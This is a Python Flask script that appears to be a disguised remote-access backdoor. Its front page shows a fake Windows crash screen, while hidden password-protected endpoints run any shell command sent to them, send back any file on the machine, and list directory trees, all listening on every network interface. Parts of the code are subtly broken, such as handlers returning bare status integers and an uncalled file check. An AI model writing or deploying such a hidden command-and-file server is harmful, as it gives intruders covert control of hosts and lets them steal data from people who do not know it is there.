import sys
import json
import bcrypt
import os
import subprocess
from flask import Flask, render_template, request, send_file

if len(sys.argv) > 1:
    try:
        port = int(sys.argv[1])
    except:
        print("invalid port")
        sys.exit(1)
else:
    port = 42068


app = Flask(__name__)

def run_cmd(command, cwd=None):
    #command = command.split(' ') # this is only needed if sheel=False
    p = subprocess.Popen(command, cwd=cwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outs, errs = p.communicate()
    rc = p.returncode
    outs = outs.decode('utf-8')
    errs = errs.decode('utf-8')

    return {'returncode': str(rc), 'stdout': str(outs), 'stderr': errs}

def checkpassword(password):
    password = password.encode('utf-8')
    correct = b'69ada40887a2d807f9796aaa5db4874c55e6b3fe0a61190f95986fc4c2596b16' 
    hashed = bcrypt.hashpw(correct, bcrypt.gensalt())

    return bcrypt.checkpw(password, hashed)



@app.route('/')
def index():
    return '''A problem has been detected and Windows has been shut down to prevent damage to your computer.

DRIVER_IRQL_NOT_LESS_OR_EQUAL

If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:

Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.

If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.

Technical information:

STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000 000,0xF86B5A89)

gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb

Beginning dump of physical memory...

Physical memory dump complete.

Contact your system administrator or technical support group for further assistance.'

'''


@app.route('/send', methods=["POST"])
def post():
    stuff = request.get_json()

    print('authorising')
    if checkpassword(str(stuff['pass'])) == False:
        return 403
    print('authorised')

    com = stuff['com']
    root = stuff['cwd']

    commandout = run_cmd(com, cwd=root)

    return commandout




@app.route('/download', methods=["POST"])
def download():
    stuff = request.get_json()

    print('authorising')
    if checkpassword(str(stuff['pass'])) == False:
        return 403
    print('authorised')

    path = stuff['path']

    if os.path.exists(path):
        if os.path.isfile:
            return send_file(path)
        else:
            "not a file"
    else:
        return "path dont exist"


@app.route('/list', methods=['POST'])
def list():
    stuff = request.get_json()

    print('authorising')
    if checkpassword(str(stuff['pass'])) == False:
        return 403
    print('authorised')

    path = stuff['path']


    # this only lists files for now, should do recursive
    if os.path.isdir(path):
        # recursive get all files in the directory
        result = [os.path.join(dp, f) for dp, dn, filenames in os.walk(path) for f in filenames if os.path.splitext(f)[1]]
        return json.dumps(result)
    else:
        return 404



if __name__ == "__main__":
    app.run(host='0.0.0.0', port=port)

